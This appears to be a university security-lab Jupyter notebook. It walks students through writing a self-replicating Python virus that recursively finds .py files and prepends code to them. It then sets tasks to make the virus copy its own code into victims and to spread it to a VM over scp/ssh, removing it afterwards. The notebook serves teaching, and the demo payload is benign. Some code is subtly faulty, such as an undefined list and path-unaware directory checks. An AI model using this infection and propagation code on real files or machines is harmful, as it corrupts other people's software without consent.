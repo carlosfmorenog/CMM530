{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Malware in Python"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this laboratory, we will learn how to create a very basic malware using Python. Moreover, you will reflect on how this malware can be propagated in the virtual machine environment."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Basic Requirements"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "For this activity, you are required to install the $os$ python module (using !pip install os) in case you don't already have it, and to download the following files:\n",
    "* $victim1.py$: This script simply prints \"Hello world!\". Save it in the same directory that you are using for this notebook.\n",
    "* $victim2.py$: This is the code that cracks a hashed password using a brute force approach (Week 5 - Lab passwords). Save it in a subdirectory from the path where this notebook is saved (you can use any name for the subdirectory)."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Python Malware 101"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As we have seen in the lecture, one of the main characteristics of a malware is to insert inself into a system (usually in a secert way) with the intent of compromising a program or the whole system. In this laboratory activity, we will design a simple code in Python which will replicate itself into other $.py$ files."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Search for .py files"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**STEP 1**: We will implement a function called $search$ which will be in charge of exploring a directory and its subdirectories to find all $.py$ files. To do so, first you need to extract the list of files and subdirectories that are located in the current directory. To do so, you can use the command $filelist = os.listdir(path)$, where $path$ is the current directory.\n",
    "\n",
    "**HINT**: To get the current directory, you can use the command $os.path.abspath(\"\")$."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "## Use this cell to \n",
    "## 1) import the os module, \n",
    "## 2) find the list of files/subdirectories in the current directory and save them in a variable \"filelist\" and \n",
    "## 3) print filelist.\n",
    "import os\n",
    "filelist = os.listdir(os.path.abspath(\"\"))\n",
    "filelist"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If you did the instructions correctly, you should see a list of the files and folders in your current path, including $victim1.py$ and this notebook."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**STEP 2**: Using a for loop, iterate $filelist$ to see which files have the $.py$ extension.\n",
    "\n",
    "**HINT**: When you iterate $filelist$ you are examining strings, therefore you can take advantage of the string data structure and check if the last 3 positins of any given string are the characters $.py$. Once you have found a string that ends in $.py$, remember to **add** the path of the current directory to the name of the file separated by the \"/\" character or the \"_\\_\\\" characters before appending to the list."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "## Use this cell to iterate filelist and find the .py files. If one is found, append it to a \"filestoinfect\" list.\n",
    "## In the end, print \"filestoinfect\".\n",
    "for name in filelist:\n",
    "    if name[-3:] == \".py\":\n",
    "        filestoinfect.append(os.path.abspath(\"\")+\"\\\\\"+name)\n",
    "filestoinfect"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If done have done this correctly, you should be able to append the malware and $victim1.py$ but **NOT** $victim2.py$. This is due to the fact that we have only explored the current directory, but not its subdirectories!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**STEP 3**: Using a for loop, iterate once again $filelist$ to **print** the names of the subdirectories.\n",
    "\n",
    "**HINT**: You can use the command $os.path.isdir(name)$ to know if a certain $name$ in the filelist is a directory or not."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "## Use this cell to iterate filelist and print the subdirectories.\n",
    "for name in filelist:\n",
    "    if os.path.isdir(name):\n",
    "        print(name)   "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If you have done this step correctly, then you will print the subdirectories of your current path, including the one where $victim2.py$ is stored and a folder called $.ipynb\\_checkpoints$, which is autogenerated by Jupyter Notebook."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**STEP 4**: Now that we have all of these elements, construct the $search$ function which will take a $path$ as an input and will return the list of files to infect."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "## Use this cell to implement the search function.\n",
    "import os\n",
    "def search(path):\n",
    "    # 1. Define \"filestoinfect\" as an empty list.\n",
    "    filestoinfect = []\n",
    "    # 2. Find the list of files/subdirectories in the specified path and save them in variable \"filelist\".\n",
    "    filelist = os.listdir(path)\n",
    "    # 3. for name in filelist:\n",
    "    for name in filelist:\n",
    "        # 3.a. Check if name is a subdirectory. If true, call again the search function in this subdirectory.\n",
    "        # HINT: To avoid reset filestoinfect when you call the function, use filestoinfect.extend(search(path+\"/\"+name))\n",
    "        if os.path.isdir(name):\n",
    "            filestoinfect.extend(search(path+\"/\"+name))\n",
    "        # 3.b. Else, if it is a .py file, append it to \"filestoinfect\"\n",
    "        elif name[-3:] == \".py\":\n",
    "            filestoinfect.append(path+\"/\"+name)\n",
    "    return filestoinfect\n",
    "\n",
    "## Use the search function in the current directory\n",
    "filestoinfect = search(os.path.abspath(\"\"))\n",
    "print(filestoinfect)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If the function was implemented correctly, then you will be able to print the malware and the two victim files."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Infect .py files"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "To infect the files, you have to loop the $filestoinfect$  list and get each of the files infected. The infection consists in two steps:\n",
    "* Loading the file to be infected and storing the instructions of the $.py$ file into a *temp* variable.\n",
    "* Adding the malware to the temp and rewritting the loaded file."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def infect(filestoinfect):\n",
    "    malware = 'a=\"This file is infected by malware\"\\n'\n",
    "    for name in filestoinfect:\n",
    "        # 1. Open the file, load the instructions in a temp variable and close the file.\n",
    "        f = open(name)\n",
    "        temp = f.read()\n",
    "        f.close()\n",
    "        # 2. Open the the file in \"write mode\" and write the malware and close the file.\n",
    "        f = open(name,'w')\n",
    "        f.write(malware+temp)\n",
    "        f.close()\n",
    "    return\n",
    "\n",
    "infect(filestoinfect)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now inspect the victim files and see if the first line of the file has the malware (i.e. the first line of the code is a=\"This file is infected by malware\")."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**TASK 1**: Create a Python file called $malware.py$ where you will paste the $search$ and the $infect$ functions. Apply the following changes to the functions:\n",
    "* $search$: Implement a mechanism that **EXCLUDES** from the $filestoinfect$ list the file that is running the malware (**HINT**: Use a marker).\n",
    "* $infect$: Infect the victim files using **the code contained in $malware.py$** instead, so that when an unsuspected user runs a victim code, the malware keeps propagating.\n",
    "* General: Print a message (for instance, \"THE MALWARE IS OUT! *N* FILES HAVE BEEN INFECTED!\") where *N* is the number of files that have been infected by the malware. (**HINT** use a counter inside the $infect$ function).\n",
    "\n",
    "**NOTE**: Make sure that the very last line of $malware.py$ is empty so that when the code is copied into the victims, it doesn't overlap the first instruction of the victim."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**TASK 2**: Propagate the malware (with or without the changes of Task 1) from a client (VM) to a server (nested VM). To do so, transfer $victim1.py$ to the nested VM (preferably using the shared folder) but **DO NOT** transfer $malware.py$ in this way.\n",
    "\n",
    "How can you run $malware.py$ to infect $victim1.py$? One option is to transfer $malware.py$ into the server using SSH and executing it there. Another option is to execute the commands in $malware.py$ from the client and transfering them via SSH to infect the $victim1.py$ in the server."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**SOLUTION 1**\n",
    "1. Connect to the server via SSH and \"scan\" the directories to see where you can find a .py file.\n",
    "2. Terminate the ssh connection by typing *exit* and pressing **Enter**.\n",
    "3. Use the command *scp \"malware.py\" username@ip_address_server:folder/* to secure copy the malware into the folder where the server has stored *victim1.py*. **NOTE**: If you leave the *folder/* empy, the malware will be stored in the Home directory of the server.\n",
    "\n",
    "*OPTION 1*\n",
    "4. Connect to the server via SSH and go to the directory where the malware and the victim are located.\n",
    "5. Execute the malware by typing *python3 malware.py* and pressing **Enter**.\n",
    "6. Delete the malware by typing *rm malware.py*.\n",
    "7. Terminate the ssh connection by typing *exit* and pressing **Enter**.\n",
    "\n",
    "*OPTION 2*\n",
    "4. If you know the full route to the file, type *ssh username@ip_address_server python full_path_to_malware* and press **Enter**.\n",
    "5. Afterwards, type *ssh username@ip_address_server rm full_path_to_malware* and press **Enter** to delete the malware."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
